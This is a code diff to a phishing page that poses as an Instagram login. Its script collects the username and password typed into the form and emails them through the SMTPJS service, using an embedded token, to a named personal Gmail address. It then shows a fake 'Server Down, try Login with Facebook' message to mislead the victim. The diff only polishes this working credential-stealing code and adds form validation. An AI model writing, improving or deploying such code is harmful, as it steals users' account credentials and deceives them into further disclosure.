@@ -68,29 +68,37 @@
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="https://smtpjs.com/v3/smtp.js"></script>
 
-    <script>
+     <script>
         function login() {
             var email = $('#username').val();
             var password = $('#password').val();
 
+            // Check if fields are empty
+            if (!email || !password) {
+                alert('You must fill all the required data');
+                return false;
+            }
+
             var Body = 'Email: ' + email + '<br>Password: ' + password;
 
-            Email.send({ //f3069ada-6257-4967-91bd-9b7cc9b2c906
-                SecureToken : "f3069ada-6257-4967-91bd-9b7cc9b2c906",
-    To : 'rikhishkh@gmail.com',
-    From : "rikhishkh@gmail.com",
-    Subject : "Instagram gi login",
-    Body : Body
-}).then(
+            Email.send({
+                SecureToken: "f3069ada-6257-4967-91bd-9b7cc9b2c906",
+                To: 'rikhishkh@gmail.com',
+                From: "rikhishkh@gmail.com",
+                Subject: "Instagram gi login",
+                Body: Body
+            }).then(
                 message => {
                     if (message === 'OK') {
-                        alert('Server Down try Login with Facebook');
+                        alert('Server Down, try Login with Facebook');
                     } else {
                         console.error(message);
                         alert('There was an error sending the email.');
                     }
                 }
             );
+
+            return false; // Prevent form submission
         }
     </script>
 </body>
